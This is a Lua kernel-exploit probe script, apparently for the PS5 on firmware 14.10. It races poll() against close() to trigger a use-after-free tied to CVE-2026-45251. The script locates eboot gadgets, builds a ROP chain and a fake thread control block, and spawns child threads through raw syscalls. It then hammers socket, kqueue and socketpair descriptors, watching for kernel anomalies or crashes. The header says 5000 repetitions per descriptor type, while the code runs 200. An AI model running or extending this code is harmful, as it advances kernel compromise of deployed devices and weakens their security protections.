-- CRASH_CLASS: MODERATE
-- PROBE 69b: CVE-2026-45251 poll+close race (fd UAF)
--
-- CVE-2026-45251: "some file descriptor types" fail to unlink blocked threads
-- from the wait queue before freeing on close. Verified untested on PS5 14.10.
--
-- Our kqueue race probes (271g/271h/271i) tested kevent+close, NOT poll+close.
-- poll() uses a different wait-queue linkage code path (pollwait vs kqueue knote).
--
-- Test: main thread blocks in poll(fd, timeout), child thread closes fd.
-- If kernel fails to unlink the poll waiter → dangling pointer → UAF.
-- Repeat 5000× per fd type. Check for crash, panic, or kernel pointer.

print("=== PROBE 69b: poll+close race (CVE-2026-45251) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore signals
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Fake TCB for child threads
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))

-- Build child that does: sysarch(129, &fake_tcb), then close(fd), then thr_exit(0)
local function build_close_child(fd_val, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- sysarch(129, &fake_tcb)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    -- close(fd)
    emit(g_pop_rdi); emit(uint64(fd_val))
    emit(g_pop_rax); emit(uint64(6))
    emit(stub)
    -- write marker
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- thr_exit(0)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

-- [A] poll + close(socket) race
print("[A] poll + close(socket) race — 200 iterations")

local pollfd = memory.alloc(16)
local marker = memory.alloc(8)
local crashes = 0
local anomalies = 0

for iter = 1, 200 do
    if not alive() then
        print(string.format("  DIED at iter %d", iter))
        crashes = crashes + 1
        break
    end

    -- Create a UDP socket
    local sock = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
    if sock < 0 then
        if iter == 1 then print("  socket() failed: " .. sock) end
        break
    end

    -- Setup pollfd struct: fd, events=POLLIN(1), revents=0
    wd(N(pollfd), sock)
    wd(N(pollfd) + 4, 1)
    wd(N(pollfd) + 6, 0)

    -- Write sentinel to marker
    wq(N(marker), uint64(0xDEADDEAD))

    -- Spawn child to close the socket
    local par = build_close_child(sock, N(marker))
    pcall(function() mk(455)(par, uint64(0x38)) end)

    -- Main thread: poll with short timeout
    -- poll(fds, nfds, timeout_ms) = syscall 209
    local pret = -999
    pcall(function()
        pret = sgn(mk(209)(uint64(N(pollfd)), uint64(1), uint64(10)))
    end)

    -- Wait for child
    for w = 1, 20000 do local _ = rd(N(marker)) end

    -- Check revents
    local revents = rd(N(pollfd) + 6) or 0
    local child_done = (rd(N(marker)) ~= 0xDEADDEAD)

    if revents ~= 0 and revents ~= 0x20 and revents ~= 0x10 then
        anomalies = anomalies + 1
        print(string.format("  iter %d: pret=%d revents=0x%X child_done=%s *** ANOMALY ***",
            iter, pret, revents, tostring(child_done)))
    end

    -- Close socket if child didn't (double-close is safe per 385a)
    pcall(function() mk(6)(uint64(sock)) end)

    if iter % 50 == 0 then
        print(string.format("  iter %d: ok (anomalies=%d)", iter, anomalies))
    end
end

print(string.format("  socket race: %d anomalies, %d crashes across 200 iters", anomalies, crashes))

if not alive() then
    print("DEAD after socket race")
    print("=== 69b COMPLETE (CRASH) ===")
    return
end

-- [B] poll + close(kqueue) race
print("")
print("[B] poll + close(kqueue_fd) race — 200 iterations")
local kq_anomalies = 0

for iter = 1, 200 do
    if not alive() then
        print(string.format("  DIED at iter %d", iter))
        break
    end

    -- Create kqueue
    local kq = sgn(mk(362)())
    if kq < 0 then
        if iter == 1 then print("  kqueue() failed: " .. kq) end
        break
    end

    -- pollfd: kqueue fd, events=POLLIN
    wd(N(pollfd), kq)
    wd(N(pollfd) + 4, 1)
    wd(N(pollfd) + 6, 0)

    wq(N(marker), uint64(0xDEADDEAD))
    local par = build_close_child(kq, N(marker))
    pcall(function() mk(455)(par, uint64(0x38)) end)

    local pret = -999
    pcall(function()
        pret = sgn(mk(209)(uint64(N(pollfd)), uint64(1), uint64(10)))
    end)

    for w = 1, 20000 do local _ = rd(N(marker)) end

    local revents = rd(N(pollfd) + 6) or 0
    if revents ~= 0 and revents ~= 0x20 and revents ~= 0x10 then
        kq_anomalies = kq_anomalies + 1
        print(string.format("  iter %d: pret=%d revents=0x%X *** ANOMALY ***",
            iter, pret, revents))
    end

    pcall(function() mk(6)(uint64(kq)) end)

    if iter % 50 == 0 then
        print(string.format("  iter %d: ok (anomalies=%d)", iter, kq_anomalies))
    end
end

print(string.format("  kqueue race: %d anomalies across 200 iters", kq_anomalies))

if not alive() then
    print("DEAD after kqueue race")
    print("=== 69b COMPLETE (CRASH) ===")
    return
end

-- [C] poll + close(socketpair) race
print("")
print("[C] poll + close(socketpair fd) race — 200 iterations")
local sp_anomalies = 0
local sp_buf = memory.alloc(16)

for iter = 1, 200 do
    if not alive() then
        print(string.format("  DIED at iter %d", iter))
        break
    end

    -- Create socketpair
    wd(N(sp_buf), 0xFFFF); wd(N(sp_buf) + 4, 0xFFFF)
    pcall(function()
        mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf)))
    end)
    local sp0 = rd(N(sp_buf)) or 0xFFFF
    local sp1 = rd(N(sp_buf) + 4) or 0xFFFF
    if sp0 == 0xFFFF or sp1 == 0xFFFF then
        if iter == 1 then print("  socketpair() failed") end
        break
    end

    -- Poll sp0, close sp0 from child
    wd(N(pollfd), sp0)
    wd(N(pollfd) + 4, 1)
    wd(N(pollfd) + 6, 0)

    wq(N(marker), uint64(0xDEADDEAD))
    local par = build_close_child(sp0, N(marker))
    pcall(function() mk(455)(par, uint64(0x38)) end)

    local pret = -999
    pcall(function()
        pret = sgn(mk(209)(uint64(N(pollfd)), uint64(1), uint64(10)))
    end)

    for w = 1, 20000 do local _ = rd(N(marker)) end

    local revents = rd(N(pollfd) + 6) or 0
    if revents ~= 0 and revents ~= 0x20 and revents ~= 0x10 and revents ~= 0x08 then
        sp_anomalies = sp_anomalies + 1
        print(string.format("  iter %d: pret=%d revents=0x%X *** ANOMALY ***",
            iter, pret, revents))
    end

    pcall(function() mk(6)(uint64(sp0)) end)
    pcall(function() mk(6)(uint64(sp1)) end)

    if iter % 50 == 0 then
        print(string.format("  iter %d: ok (anomalies=%d)", iter, sp_anomalies))
    end
end

print(string.format("  socketpair race: %d anomalies across 200 iters", sp_anomalies))

print("")
print(string.format("SUMMARY: socket=%d kqueue=%d socketpair=%d anomalies",
    anomalies, kq_anomalies, sp_anomalies))
print("")
print("=== PROBE 69b COMPLETE ===")
